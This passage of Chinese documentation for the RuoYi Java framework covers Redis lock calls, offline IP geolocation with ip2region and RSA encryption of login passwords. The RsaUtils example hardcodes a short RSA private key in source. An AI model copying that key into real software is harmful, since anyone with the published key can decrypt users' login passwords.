<span class="token comment">// lockKey 锁实例key waitTime 最多等待时间 leaseTime 上锁后自动释放锁时间  unit 时间颗粒度</span>
redisLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
redisLock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> leaseTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
redisLock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> leaseTime<span class="token punctuation">,</span> unit<span class="token punctuation">)</span><span class="token punctuation">;</span>
redisLock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> waitTime<span class="token punctuation">,</span> leaseTime<span class="token punctuation">,</span> unit<span class="token punctuation">)</span><span class="token punctuation">;</span>
redisLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
redisLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2><a id="12ip2regionIP_7280"></a>12、集成ip2region实现离线IP地址定位</h2>
<p>离线IP地址定位库主要用于内网或想减少对外访问<code>http</code>带来的资源消耗。<code>（代码已兼容支持jar包部署）</code></p>
<p>1、引入依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- 离线IP地址定位库 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.lionsoul<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ip2region<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.7.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>2、添加工具类<code>RegionUtil.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>lionsoul<span class="token punctuation">.</span>ip2region<span class="token punctuation">.</span></span><span class="token class-name">DataBlock</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>lionsoul<span class="token punctuation">.</span>ip2region<span class="token punctuation">.</span></span><span class="token class-name">DbConfig</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>lionsoul<span class="token punctuation">.</span>ip2region<span class="token punctuation">.</span></span><span class="token class-name">DbSearcher</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>lionsoul<span class="token punctuation">.</span>ip2region<span class="token punctuation">.</span></span><span class="token class-name">Util</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>core<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ClassPathResource</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 根据ip离线查询地址
 *
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RegionUtil</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">RegionUtil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> JAVA_TEMP_DIR <span class="token operator">=</span> <span class="token string">"java.io.tmpdir"</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token class-name">DbConfig</span> config <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token class-name">DbSearcher</span> searcher <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 初始化IP库
     */</span>
    <span class="token keyword">static</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// 因为jar无法读取文件,复制创建临时文件</span>
            <span class="token class-name">String</span> dbPath <span class="token operator">=</span> <span class="token class-name">RegionUtil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">"/ip2region/ip2region.db"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>dbPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                <span class="token class-name">String</span> tmpDir <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>JAVA_TEMP_DIR<span class="token punctuation">)</span><span class="token punctuation">;</span>
                dbPath <span class="token operator">=</span> tmpDir <span class="token operator">+</span> <span class="token string">"ip2region.db"</span><span class="token punctuation">;</span>
                file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>dbPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ClassPathResource</span> cpr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathResource</span><span class="token punctuation">(</span><span class="token string">"ip2region"</span> <span class="token operator">+</span> <span class="token class-name">File</span><span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">"ip2region.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">InputStream</span> resourceAsStream <span class="token operator">=</span> cpr<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceAsStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                <span class="token punctuation">{<!-- --></span>
                    <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">copyInputStreamToFile</span><span class="token punctuation">(</span>resourceAsStream<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DbConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            searcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DbSearcher</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> dbPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"bean [{}]"</span><span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">;</span>
            log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"bean [{}]"</span><span class="token punctuation">,</span> searcher<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"init ip region error:{}"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 解析IP
     *
     * @param ip
     * @return
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getRegion</span><span class="token punctuation">(</span><span class="token class-name">String</span> ip<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// db</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>searcher <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"DbSearcher is null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span>EMPTY<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 查询算法</span>
            <span class="token keyword">int</span> algorithm <span class="token operator">=</span> <span class="token class-name">DbSearcher</span><span class="token punctuation">.</span>MEMORY_ALGORITYM<span class="token punctuation">;</span>
            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token keyword">switch</span> <span class="token punctuation">(</span>algorithm<span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">case</span> <span class="token class-name">DbSearcher</span><span class="token punctuation">.</span>BTREE_ALGORITHM<span class="token operator">:</span>
                    method <span class="token operator">=</span> searcher<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"btreeSearch"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token class-name">DbSearcher</span><span class="token punctuation">.</span>BINARY_ALGORITHM<span class="token operator">:</span>
                    method <span class="token operator">=</span> searcher<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"binarySearch"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token keyword">case</span> <span class="token class-name">DbSearcher</span><span class="token punctuation">.</span>MEMORY_ALGORITYM<span class="token operator">:</span>
                    method <span class="token operator">=</span> searcher<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"memorySearch"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token class-name">DataBlock</span> dataBlock <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">isIpAddress</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                log<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"warning: Invalid ip address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            dataBlock <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DataBlock</span><span class="token punctuation">)</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>searcher<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> result <span class="token operator">=</span> dataBlock<span class="token punctuation">.</span><span class="token function">getRegion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">long</span> endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"region use time[{}] result[{}]"</span><span class="token punctuation">,</span> endTime <span class="token operator">-</span> startTime<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> result<span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"error:{}"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span>EMPTY<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>3、修改<code>AddressUtils.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>ip</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">RuoYiConfig</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">RegionUtil</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 获取地址类
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AddressUtils</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">AddressUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 未知地址</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> UNKNOWN <span class="token operator">=</span> <span class="token string">"XX XX"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getRealAddressByIP</span><span class="token punctuation">(</span><span class="token class-name">String</span> ip<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">String</span> address <span class="token operator">=</span> UNKNOWN<span class="token punctuation">;</span>
        <span class="token comment">// 内网不查询</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">IpUtils</span><span class="token punctuation">.</span><span class="token function">internalIp</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string">"内网IP"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">RuoYiConfig</span><span class="token punctuation">.</span><span class="token function">isAddressEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">try</span>
            <span class="token punctuation">{<!-- --></span>
                <span class="token class-name">String</span> rspStr <span class="token operator">=</span> <span class="token class-name">RegionUtil</span><span class="token punctuation">.</span><span class="token function">getRegion</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>rspStr<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{<!-- --></span>
                    log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"获取地理位置异常 {}"</span><span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> UNKNOWN<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> obj <span class="token operator">=</span> rspStr<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"\\|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">String</span> region <span class="token operator">=</span> obj<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token class-name">String</span> city <span class="token operator">=</span> obj<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

                <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s %s"</span><span class="token punctuation">,</span> region<span class="token punctuation">,</span> city<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
            <span class="token punctuation">{<!-- --></span>
                log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"获取地理位置异常 {}"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> address<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、添加离线IP地址库插件</p>
<p>下载前端插件相关包和代码实现<code>ruoyi/集成ip2region离线地址定位.zip</code></p>
<p>链接: https://pan.baidu.com/s/13JVC9jm-Dp9PfHdDDylLCQ 提取码: y9jt</p>
<p>5、添加离线IP地址库</p>
<p>在<code>src/main/resources</code>下新建<code>ip2region</code>复制文件<code>ip2region.db</code>到目录下。</p>
<h2><a id="13jsencrypt_7485"></a>13、集成jsencrypt实现密码加密传输方式</h2>
<p>目前登录接口密码是明文传输，如果安全性有要求，可以调整成加密方式传输。参考如下</p>
<p>1、修改前端<code>login.js</code>对密码进行<code>rsa</code>加密。</p>
<pre><code class="prism language-js"><span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> encrypt <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/utils/jsencrypt'</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> code<span class="token punctuation">,</span> uuid</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  password <span class="token operator">=</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、工具类<code>sign</code>包下添加<code>RsaUtils.java</code>，用于<code>RSA</code>加密解密。</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>sign</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>interfaces<span class="token punctuation">.</span></span><span class="token class-name">RSAPrivateKey</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>interfaces<span class="token punctuation">.</span></span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">PKCS8EncodedKeySpec</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * RSA加密解密
 * 
 * @author ruoyi
 **/</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RsaUtils</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Rsa 私钥</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> privateKey <span class="token operator">=</span> <span class="token string">"MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAqhHyZfSsYourNxaY"</span>
            <span class="token operator">+</span> <span class="token string">"7Nt+PrgrxkiA50efORdI5U5lsW79MmFnusUA355oaSXcLhu5xxB38SMSyP2KvuKN"</span>
            <span class="token operator">+</span> <span class="token string">"PuH3owIDAQABAkAfoiLyL+Z4lf4Myxk6xUDgLaWGximj20CUf+5BKKnlrK+Ed8gA"</span>
            <span class="token operator">+</span> <span class="token string">"kM0HqoTt2UZwA5E2MzS4EI2gjfQhz5X28uqxAiEA3wNFxfrCZlSZHb0gn2zDpWow"</span>
            <span class="token operator">+</span> <span class="token string">"cSxQAgiCstxGUoOqlW8CIQDDOerGKH5OmCJ4Z21v+F25WaHYPxCFMvwxpcw99Ecv"</span>
            <span class="token operator">+</span> <span class="token string">"DQIgIdhDTIqD2jfYjPTY8Jj3EDGPbH2HHuffvflECt3Ek60CIQCFRlCkHpi7hthh"</span>
            <span class="token operator">+</span> <span class="token string">"YhovyloRYsM+IS9h/0BzlEAuO0ktMQIgSPT3aFAgJYwKpqRYKlLDVcflZFCKY7u3"</span> 
            <span class="token operator">+</span> <span class="token string">"UP8iWi1Qw0Y="</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 私钥解密
     *
     * @param privateKeyString 私钥
     * @param text 待解密的文本
     * @return 解密后的文本
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decryptByPrivateKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">decryptByPrivateKey</span><span class="token punctuation">(</span>privateKey<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 公钥解密
     *
     * @param publicKeyString 公钥
     * @param text 待解密的信息
     * @return 解密后的文本
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">decryptByPublicKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> publicKeyString<span class="token punctuation">,</span> <span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">X509EncodedKeySpec</span> x509EncodedKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>publicKeyString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">KeyFactory</span> keyFactory <span class="token operator">=</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PublicKey</span> publicKey <span class="token operator">=</span> keyFactory<span class="token punctuation">.</span><span class="token function">generatePublic</span><span class="token punctuation">(</span>x509EncodedKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span>DECRYPT_MODE<span class="token punctuation">,</span> publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 私钥加密
     *
     * @param privateKeyString 私钥
     * @param text 待加密的信息
     * @return 加密后的文本
     */</span>
